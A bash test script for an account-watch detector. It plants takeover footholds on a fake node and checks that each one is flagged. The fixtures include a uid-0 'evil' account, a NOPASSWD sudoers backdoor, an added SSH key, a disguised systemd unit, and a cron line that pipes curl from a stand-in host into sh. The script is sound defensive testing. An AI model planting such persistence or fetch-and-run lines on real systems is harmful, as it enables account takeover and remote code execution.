#!/bin/bash
# The account watch against a fake node: each way a takeover gets a foothold is flagged, a clean night stays quiet.
#   bash tests/account-watch/run.sh
set -uo pipefail
HERE="$(cd "$(dirname "$0")/../.." && pwd)"; W="$HERE/scripts/account-watch.py"
D="$(mktemp -d)"; trap 'rm -rf "${D:?}"' EXIT
pass=0; fail=0
has()  { grep -F -- "$2" <<<"$3" >/dev/null && { pass=$((pass+1)); echo "  ok   $1"; } || { fail=$((fail+1)); echo "  FAIL $1 (no '$2')"; sed 's/^/       /' <<<"$3"; }; }
none() { grep -F "FLAG" <<<"$2" >/dev/null && { fail=$((fail+1)); echo "  FAIL $1"; sed 's/^/       /' <<<"$2"; } || { pass=$((pass+1)); echo "  ok   $1"; }; }
lacks() { grep -F -- "$2" <<<"$3" >/dev/null && { fail=$((fail+1)); echo "  FAIL $1 (found '$2')"; } || { pass=$((pass+1)); echo "  ok   $1"; }; }

R="$D/root"; mkdir -p "$R/etc/sudoers.d" "$R/etc/cron.d" "$R/var/spool/cron/crontabs" "$R/etc/systemd/system" "$R/home/op/.ssh" "$D/bin"
cat > "$R/etc/passwd" <<'E'
root:x:0:0:root:/root:/bin/bash
op:x:1000:1000::/home/op:/bin/bash
www-data:x:33:33::/var/www:/usr/sbin/nologin
E
printf 'sudo:x:27:op\ndocker:x:999:\nadm:x:4:syslog,op\nusers:x:100:\n' > "$R/etc/group"
printf 'root ALL=(ALL:ALL) ALL\n%%sudo ALL=(ALL:ALL) ALL\n' > "$R/etc/sudoers"
printf 'op ALL=(root) NOPASSWD: /usr/bin/systemctl restart gnode-daemon\n' > "$R/etc/sudoers.d/deploy"
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBaseKeyBaseKeyBaseKeyBaseKeyBaseKeyBaseKey00 op@laptop" > "$R/home/op/.ssh/authorized_keys"
echo "*/5 * * * * root /opt/sweep" > "$R/etc/cron.d/sweep"
touch "$R/etc/systemd/system/gnode-daemon.service"
NOW=$(date +%Y-%m-%dT%H:%M:%S+01:00)
cat > "$D/bin/last" <<E
#!/bin/bash
cat "$D/last.out"
E
cat > "$D/bin/auth" <<E
#!/bin/bash
cat "$D/auth.out"
E
cat > "$D/bin/docker" <<E
#!/bin/bash
cat "$D/docker.out"
E
cat > "$D/bin/wg" <<E
#!/bin/bash
cat "$D/wg.out"
E
cat > "$D/bin/ports" <<E
#!/bin/bash
cat "$D/ports.out"
E
chmod +x "$D/bin/"*
echo "op       pts/0        203.0.113.7      $NOW   still logged in" > "$D/last.out"
printf '%s host sudo[1]:   op : TTY=pts/0 ; PWD=/home/op ; USER=root ; COMMAND=/usr/bin/systemctl restart gnode-daemon\n%s host sudo[2]:     root : PWD=/ ; USER=op ; COMMAND=/usr/bin/git fetch origin main\n' "$NOW" "$NOW" > "$D/auth.out"
echo "valkey/valkey:latest@sha256:aaa" > "$D/docker.out"
printf 'tcp LISTEN 0 511 127.0.0.1:47445 0.0.0.0:*\nudp UNCONN 0 0 0.0.0.0:53601 0.0.0.0:*\n' > "$D/ports.out"
printf 'wg-geodineum\t53601\n' > "$D/wg.out"
go() { python3 -I "$W" --root "$R" --state "$D/st" --status "$D/nodir/s" --no-alert \
       --cmd-last "$D/bin/last" --cmd-auth "$D/bin/auth" --cmd-docker "$D/bin/docker" --cmd-ports "$D/bin/ports" --cmd-wg "$D/bin/wg" "$@" 2>&1; }

o=$(go); none "first run: baseline, no flags" "$o"; has "first run says baseline" "baseline recorded" "$o"
has "the digest names who logged in and from where" "logins op: 203.0.113.7 x1" "$o"
has "the digest counts the operator's sudo" "sudo op: 1" "$o"
has "the sweep's sudo is counted apart" "sudo root (the sweep and timers): 1" "$o"
lacks "nothing secret in the state" "AAAAC3Nza" "$(cat "$D/st/state.json")"
o=$(go); none "second run, same node: quiet" "$o"

echo "evil:x:0:0::/home/evil:/bin/bash" >> "$R/etc/passwd"; o=$(go)
has "a new account that can log in (uid 0)" "account that can log in: new evil: uid 0" "$o"
go --accept >/dev/null; o=$(go); none "accepted: quiet" "$o"

sed -i 's/^docker:x:999:$/docker:x:999:op/' "$R/etc/group"; o=$(go); has "someone added to docker" "group docker: 1 added" "$o"; go --accept >/dev/null
printf 'op ALL=(ALL) NOPASSWD: /usr/bin/tee\n' > "$R/etc/sudoers.d/zz-backdoor"; o=$(go); has "a new sudoers file" "sudoers: new zz-backdoor" "$o"; has "and its line" "+ op ALL=(ALL) NOPASSWD: /usr/bin/tee" "$o"; go --accept >/dev/null
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEvilKeyEvilKeyEvilKeyEvilKeyEvilKeyEvilKeyEv1 x@y" >> "$R/home/op/.ssh/authorized_keys"; o=$(go)
has "a key added to authorized_keys" "ssh key op: 1 added" "$o"; go --accept >/dev/null
echo "* * * * * curl -s http://x.example/p | sh" > "$R/var/spool/cron/crontabs/www-data"; o=$(go); has "a crontab for the web user" "crontab: new /var/spool/cron/crontabs/www-data" "$o"; go --accept >/dev/null
echo 'API_TOKEN=abc123 0 * * * * root /x' > "$R/etc/cron.d/tok"; o=$(go); lacks "a token in a crontab is masked" "abc123" "$o"; go --accept >/dev/null
touch "$R/etc/systemd/system/kworker.service"; o=$(go); has "a new systemd unit" "systemd unit: 1 added" "$o"; go --accept >/dev/null
echo "mariadb:11@sha256:bbb" >> "$D/docker.out"; o=$(go); has "a pulled image" "docker image: 1 added" "$o"; go --accept >/dev/null
printf 'tcp LISTEN 0 5 0.0.0.0:4444 0.0.0.0:*\n' >> "$D/ports.out"; o=$(go); has "a new listener" "+ tcp 0.0.0.0:4444" "$o"; go --accept >/dev/null
echo "op       pts/1        198.51.100.9     $NOW   still logged in" >> "$D/last.out"; o=$(go)
has "a login from an address never seen for that account" "login: op from 198.51.100.9" "$o"
o=$(go); lacks "the address is remembered after one night" "login: op from 198.51.100.9" "$o"
o=$(go); none "and the node is quiet again" "$o"
printf 'exit 1\n' > "$D/bin/docker"; o=$(go); none "docker not answering is not 'every image removed'" "$o"
sed -i 's/53601/53136/' "$D/ports.out" "$D/wg.out"; o=$(go); none "WireGuard's port changing at a reboot is not a new listener" "$o"
old_baseline() { python3 -I -c 'import json,sys; f=sys.argv[1]; s=json.load(open(f)); s.pop("wg_excluded",None); s["ports"]=sorted(s["ports"]+sys.argv[2:]); json.dump(s,open(f,"w"))' "$D/st/state.json" "$@"; }
old_baseline "udp 0.0.0.0:41000"; o=$(go); none "a baseline from before the WireGuard rule: its gone UDP port is not 'removed'" "$o"
o=$(go); none "and stays quiet after that" "$o"
old_baseline "tcp 0.0.0.0:9999"; o=$(go); has "the migration still flags a TCP listener that went away" "listening port: 1 removed" "$o"; go --accept >/dev/null
has "the digest is kept on the node" '"lines"' "$(cat "$D/st/digest.json")"
echo "== $pass ok, $fail failed"; exit $(( fail > 0 ))
